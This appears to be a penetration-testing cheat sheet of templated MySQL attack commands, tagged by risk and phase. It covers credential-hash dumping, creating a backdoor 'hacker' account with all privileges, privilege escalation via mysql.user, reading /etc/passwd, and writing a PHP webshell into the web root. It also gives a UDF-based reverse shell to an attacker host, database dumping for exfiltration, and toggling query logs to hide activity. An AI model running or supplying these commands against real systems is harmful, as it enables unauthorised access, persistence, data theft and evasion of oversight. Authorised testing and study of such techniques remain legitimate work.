# MySQL
> Relational database enumeration, exploitation, and credential extraction
<!-- tags: mysql,database,sql,enumeration -->

---

## connect root no password
Test for default root login without authentication.

```bash
mysql -u root
```

<!-- meta: risk=safe | phase=enum | tags=mysql,unauth,connect -->

---

## connect remote authenticated
Authenticate to MySQL instance with username and password.

```bash
mysql -h {{TARGET:ip}} -u {{USERNAME:str:root}} -p
```

<!-- meta: risk=low | phase=enum | tags=mysql,auth,remote -->

---

## connect ssl disabled
Force connection without SSL (some misconfigured servers require this).

```bash
mysql -u {{USERNAME:str}} -p -h {{TARGET:ip}} --skip-ssl
```

<!-- meta: risk=low | phase=enum | tags=mysql,ssl-disabled -->

---

## list databases tables
Enumerate available databases and tables in current DB.

```sql
SHOW DATABASES;
USE {{DATABASE:str}};
SHOW TABLES;
```

<!-- meta: risk=low | phase=enum | tags=mysql,databases,tables -->

---

## describe table structure
View column names, types, and constraints for a table.

```sql
DESCRIBE {{TABLE:str:users}};
```

<!-- meta: risk=safe | phase=enum | tags=mysql,schema,describe -->

---

## dump user hashes
Read MySQL user table for credential hashes.

```sql
SELECT User, Host, authentication_string FROM mysql.user;
```

<!-- meta: risk=med | phase=post | tags=mysql,credentials,hashes -->

---

## show user grants privileges
List grants assigned to a specific user account.

```sql
SHOW GRANTS FOR '{{USERNAME:str}}'@'{{HOST:str:%}}';
```

<!-- meta: risk=safe | phase=enum | tags=mysql,privileges,grants -->

---

## show version variables config
Inspect MySQL configuration and version for known CVEs.

```sql
SELECT VERSION();
SHOW VARIABLES;
```

<!-- meta: risk=safe | phase=enum | tags=mysql,version,config -->

---

## create backdoor user privileges
Create a new MySQL user with full privileges from any host.

```sql
CREATE USER '{{USERNAME:str:hacker}}'@'%' IDENTIFIED BY '{{PASSWORD:str:Pwn3d!}}';
GRANT ALL PRIVILEGES ON *.* TO '{{USERNAME:str:hacker}}'@'%';
FLUSH PRIVILEGES;
```

<!-- meta: risk=critical | phase=post | tags=mysql,backdoor,persistence -->

---

## privesc update mysql.user
Grant SUPER privilege by updating mysql.user directly.

```sql
UPDATE mysql.user SET Super_priv='Y' WHERE user='{{USERNAME:str}}';
FLUSH PRIVILEGES;
```

<!-- meta: risk=critical | phase=post | tags=mysql,privesc -->

---

## read file load data infile
Read a local file into a MySQL table (server-side).

```sql
LOAD DATA INFILE '/etc/passwd' INTO TABLE {{TABLE:str:backup}};
```

<!-- meta: risk=high | phase=post | tags=mysql,file-read,lfi -->

---

## write webshell into outfile
Write attacker-controlled data to disk (e.g., webshell).

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

<!-- meta: risk=critical | phase=exploit | tags=mysql,webshell,file-write -->

---

## reverse shell udf rce
Execute system commands through user-defined function (lib_mysqludf_sys).

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1');
```

<!-- meta: risk=critical | phase=exploit | tags=mysql,rce,udf -->

---

## dump database exfil
Export an entire database to a SQL file for exfil.

```bash
mysqldump -h {{TARGET:ip}} -u {{USERNAME:str}} -p {{DATABASE:str}} > {{OUTFILE:file:dump.sql}}
```

<!-- meta: risk=high | phase=post | tags=mysql,dump,exfil -->

---

## toggle query logging evasion
Enable or disable general_log to capture or hide SQL queries.

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log = 'OFF';
SHOW VARIABLES LIKE 'general_log_file';
```

<!-- meta: risk=med | phase=post | tags=mysql,logging,evasion -->
